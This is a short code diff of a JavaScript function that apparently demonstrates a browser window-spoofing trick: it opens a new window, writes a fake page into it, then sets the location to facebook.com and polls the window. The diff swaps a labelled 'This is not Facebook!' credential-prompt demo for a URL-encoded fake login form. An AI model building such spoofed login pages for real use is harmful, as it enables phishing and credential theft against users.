@@ -5,12 +5,7 @@
 
   function f() {
     w = window.open("");
-    w.document.write(`<h1>This is not Facebook!</h1>
-<button onclick="
-  let username = prompt('Enter your username');
-  let password = prompt('Enter your password');
-  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
-">Click me</button>`);
+    w.document.write(`%3Cinput%20type%3D%22test%22%20value%3D%22test%40gmail.com%22%3E%3Cbr%3E%3Cinput%20type%3D%22text%22%20value%3D%22password%22%3E%3Cbr%3E%3Cbutton%20type%3D%22submit%22%3ESend%3C%2Fbutton%3E`);
     w.location = "https://facebook.com";
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
   }
